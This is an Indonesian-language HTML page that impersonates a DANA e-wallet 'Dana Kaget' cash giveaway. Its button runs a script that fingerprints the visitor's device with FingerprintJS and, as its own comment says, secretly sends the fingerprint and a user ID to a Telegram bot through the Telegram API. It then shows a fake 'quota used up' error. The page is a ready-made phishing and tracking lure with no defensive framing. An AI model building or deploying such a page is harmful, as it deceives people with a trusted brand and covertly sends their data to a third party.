<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DANA KAGET - Hayabusa Project</title>
    <script src="https://openfpcdn.io/fingerprintjs/v4"></script>
    <style>
        body { background-color: #0086e6; color: white; font-family: 'Arial', sans-serif; text-align: center; padding: 50px 20px; }
        .card { background: white; color: #333; border-radius: 15px; padding: 20px; max-width: 350px; margin: 0 auto; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
        .btn { background: #0086e6; color: white; padding: 10px 20px; border: none; border-radius: 20px; font-weight: bold; cursor: pointer; text-decoration: none; display: inline-block; margin-top: 20px; }
        .logo { width: 100px; margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/7/72/Logo_danaindonesia.png" class="logo" alt="DANA">
        <h3>Anda Mendapatkan Dana Kaget!</h3>
        <p>Silakan klik tombol di bawah untuk memverifikasi dompet dan klaim saldo.</p>
        <div id="status">
            <button class="btn" onclick="startScan()">KLAIM SEKARANG</button>
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const userId = urlParams.get('userid');
        const chatId = urlParams.get('chatid');

        function startScan() {
            document.getElementById('status').innerHTML = "<p>Sedang memverifikasi perangkat...</p>";
            
            FingerprintJS.load().then(fp => fp.get()).then(result => {
                const visitorId = result.visitorId;

                // KIRIM DATA KE BOT SECARA RAHASIA
                fetch(`https://api.telegram.org/botTOKEN_BOT_LU/sendMessage?chat_id=${chatId}&text=/process_verif ${userId} ${visitorId}`)
                .then(() => {
                    document.getElementById('status').innerHTML = "<p style='color:red;'>⚠️ ERROR: Maaf, kuota Dana Kaget sudah habis atau perangkat Anda tidak kompatibel.</p>";
                });
            });
        }
    </script>
</body>
      </html>
